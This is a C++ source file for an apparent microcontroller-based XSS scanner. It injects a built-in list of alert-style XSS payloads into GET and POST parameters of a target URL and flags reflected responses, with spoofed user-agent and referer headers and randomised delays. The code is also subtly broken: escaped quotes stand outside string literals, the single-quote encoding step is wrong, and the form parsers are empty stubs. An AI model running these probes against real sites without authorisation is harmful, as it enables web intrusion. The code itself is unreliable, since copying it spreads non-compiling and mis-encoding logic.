// xss_tester.cpp
#include "xss_tester.h"
#include <ArduinoJson.h> // For parsing HTML (basic) or use string manipulation

// Basic XSS Payloads (can be expanded)
const std::vector<String> default_xss_payloads = {
    "<script>alert(\'XSS\')</script>",
    "\"<script>alert(\'XSS\')</script>",
    "\'<script>alert(\'XSS\')</script>",
    "<img src=x onerror=alert(\'XSS\')>",
    "\"<img src=x onerror=alert(\'XSS\')>",
    "\'<img src=x onerror=alert(\'XSS\')>",
    "<svg onload=alert(\'XSS\')>",
    "<iframe src=\"javascript:alert(\'XSS\')\">",
    "javascript:alert(\'XSS\')", // For URL-based XSS
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=" // data URI
};

XSSTester::XSSTester() {
    // Constructor, initialize if needed
}

String XSSTester::constructUrlWithPayload(String baseUrl, String paramName, String payload) {
    String queryChar = (baseUrl.indexOf(\"?\") == -1) ? \"?\" : \"&\";
    // Basic URL encoding for the payload. A more robust encoder should be used for production.
    String encodedPayload = payload;
    encodedPayload.replace(" ", "%20");
    encodedPayload.replace("<", "%3C");
    encodedPayload.replace(">", "%3E");
    encodedPayload.replace("#", "%23");
    encodedPayload.replace("\"", "%22");
    encodedPayload.replace("\"", "%27"); // single quote
    return baseUrl + queryChar + paramName + "=" + encodedPayload;
}

String XSSTester::constructPostDataWithPayload(const std::vector<String>& params, String targetParam, String payload) {
    String postData = "";
    // Basic URL encoding for the payload.
    String encodedPayload = payload;
    encodedPayload.replace(" ", "%20");
    encodedPayload.replace("<", "%3C");
    encodedPayload.replace(">", "%3E");
    encodedPayload.replace("#", "%23");
    encodedPayload.replace("\"", "%22");
    encodedPayload.replace("\"", "%27"); // single quote
    encodedPayload.replace("&", "%26");
    encodedPayload.replace("=", "%3D");

    for (size_t i = 0; i < params.size(); ++i) {
        if (i > 0) postData += "&";
        String paramPair = params[i];
        int eqPos = paramPair.indexOf(\'=\');
        if (eqPos != -1) {
            String pName = paramPair.substring(0, eqPos);
            String pValue = paramPair.substring(eqPos + 1);
            if (pName.equals(targetParam)) {
                postData += pName + "=" + encodedPayload; // Use encoded payload
            } else {
                postData += pName + "=" + pValue;
            }
        } else {
            // If it's the target parameter without a value initially, append payload
            if (paramPair.equals(targetParam)){
                 postData += paramPair + "=" + encodedPayload;
            } else {
                 postData += paramPair + "="; // Handle params without values if necessary
            }
        }
    }
    // If targetParam was not in existing params, add it.
    if (postData.indexOf(targetParam + "=") == -1) {
        if (!postData.isEmpty()) postData += "&";
        postData += targetParam + "=" + encodedPayload;
    }
    return postData;
}

// Updated sendRequest to use WebExploitSettings
String XSSTester::sendRequest(String url, String method, String data, const WebExploitSettings& settings) {
    String response = "";
    
    // Proxy settings are complex for HTTPClient on ESP32 and often require specific library versions or manual setup.
    // For now, we are not implementing direct proxy support in this function but acknowledge it via settings.
    // if (settings.useProxy && !settings.proxyHost.isEmpty() && settings.proxyPort > 0) {
    //     http.setProxy(settings.proxyHost, settings.proxyPort /*, settings.proxyUser, settings.proxyPass if supported */);
    // }

    http.begin(url);
    http.setUserAgent(settings.currentUserAgent);
    if (!settings.currentReferer.isEmpty()) {
        http.addHeader("Referer", settings.currentReferer);
    }
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    http.setTimeout(10000); // 10 seconds timeout

    int httpCode = 0;
    if (method.equalsIgnoreCase("GET")) {
        httpCode = http.GET();
    } else if (method.equalsIgnoreCase("POST")) {
        http.addHeader("Content-Type", "application/x-www-form-urlencoded");
        httpCode = http.POST(data);
    }

    if (httpCode > 0) {
        if (httpCode == HTTP_CODE_OK || httpCode == HTTP_CODE_MOVED_PERMANENTLY || httpCode == HTTP_CODE_FOUND) {
            response = http.getString();
        }
    } else {
        response = "Error on HTTP request: " + http.errorToString(httpCode);
    }
    http.end();
    return response;
}

String XSSTester::checkPageForXSS(const String& pageContent, const String& payload) {
    if (pageContent.startsWith("Error on HTTP request:")) return "";

    String unescapedPayloadPart = payload;
    // Simplify the check: if the core part of a script tag payload is found unescaped.
    // e.g., for "<script>alert('XSS')</script>", look for "alert('XSS')"
    // This is still a heuristic.
    if (payload.indexOf("<script>") != -1) {
        int start = payload.indexOf("<script>") + 8;
        int end = payload.lastIndexOf("</script>");
        if (end > start) {
            unescapedPayloadPart = payload.substring(start, end);
        }
    } else if (payload.indexOf("onerror=") != -1) {
         int start = payload.indexOf("onerror=") + 8;
         unescapedPayloadPart = payload.substring(start);
         if (unescapedPayloadPart.endsWith(">")) unescapedPayloadPart.remove(unescapedPayloadPart.length()-1);
         if (unescapedPayloadPart.endsWith("\"")) unescapedPayloadPart.remove(unescapedPayloadPart.length()-1);
         if (unescapedPayloadPart.endsWith("\'")) unescapedPayloadPart.remove(unescapedPayloadPart.length()-1);
    }

    if (pageContent.indexOf(unescapedPayloadPart) != -1) {
        // Further check if the original payload is present literally (less likely for complex ones)
        // or if the unescaped part is there and the original tags are also somewhat present.
        bool scriptTagsPresent = (pageContent.indexOf("<script") != -1 && pageContent.indexOf("</script>") != -1);
        bool imgErrorPresent = (pageContent.indexOf("<img") != -1 && pageContent.indexOf("onerror") != -1);

        if (pageContent.indexOf(payload) != -1) {
             return "Potential XSS found with payload: " + payload + " (Payload directly reflected)";
        }
        if ((scriptTagsPresent || imgErrorPresent) && pageContent.indexOf(unescapedPayloadPart) != -1 ){
            return "Potential XSS found with payload: " + payload + " (Key part \"" + unescapedPayloadPart + "\" reflected within active tags context)";
        }
        return "Payload part \"" + unescapedPayloadPart + "\" reflected: " + payload + " (Manual verification needed)";
    }
    return "";
}

// Updated beginTest to use WebExploitSettings
String XSSTester::beginTest(String targetUrl, String targetParameter, const std::vector<String>& payloadsToUse, const WebExploitSettings& settings) {
    String results = "Starting XSS Test on: " + targetUrl;
    if (!targetParameter.isEmpty()) {
        results += " (Parameter: " + targetParameter + ")\n";
    } else {
        results += " (Testing common GET parameters and form inputs - simplified)\n";
    }
    results += "User-Agent: " + settings.currentUserAgent + "\n";
    if (!settings.currentReferer.isEmpty()) results += "Referer: " + settings.currentReferer + "\n";
    results += "Request Delay: " + String(settings.requestDelayMs) + "ms (Random: " + (settings.useRandomDelay ? "Yes" : "No") + ")\n";

    const std::vector<String>& current_payloads = payloadsToUse.empty() ? default_xss_payloads : payloadsToUse;

    for (const String& payload : current_payloads) {
        String testUrl;
        String responseContent;
        String finding;

        if (!targetParameter.isEmpty()) {
            // Test specific GET parameter
            testUrl = constructUrlWithPayload(targetUrl, targetParameter, payload);
            results += "Testing GET: " + testUrl + "\n";
            responseContent = sendRequest(testUrl, "GET", "", settings);
            finding = checkPageForXSS(responseContent, payload);
            if (!finding.isEmpty()) {
                results += "  -> " + finding + "\n";
            }
            delay(settings.getEffectiveDelay());

            // Test specific POST parameter (assuming targetUrl is the form action URL)
            std::vector<String> postParams; 
            postParams.push_back(targetParameter + "=");
            String postData = constructPostDataWithPayload(postParams, targetParameter, payload);
            results += "Testing POST to " + targetUrl + " with data: " + postData + "\n";
            responseContent = sendRequest(targetUrl, "POST", postData, settings);
            finding = checkPageForXSS(responseContent, payload);
            if (!finding.isEmpty()) {
                results += "  -> " + finding + "\n";
            }
            delay(settings.getEffectiveDelay());
        } else {
            // Simplified: if no specific parameter, try a common one like 'q' or 'search'
            String commonParam = "q";
            testUrl = constructUrlWithPayload(targetUrl, commonParam, payload);
            results += "Testing GET (common param \'" + commonParam + "\'): " + testUrl + "\n";
            responseContent = sendRequest(testUrl, "GET", "", settings);
            finding = checkPageForXSS(responseContent, payload);
            if (!finding.isEmpty()) {
                results += "  -> " + finding + "\n";
            }
            delay(settings.getEffectiveDelay());
        }
    }
    results += "XSS Test Finished.\n";
    return results;
}

std::vector<String> XSSTester::extractForms(const String& htmlContent) {
    std::vector<String> forms;
    return forms;
}

std::vector<String> XSSTester::extractParamsFromForm(const String& formHtml) {
    std::vector<String> params;
    return params;
}

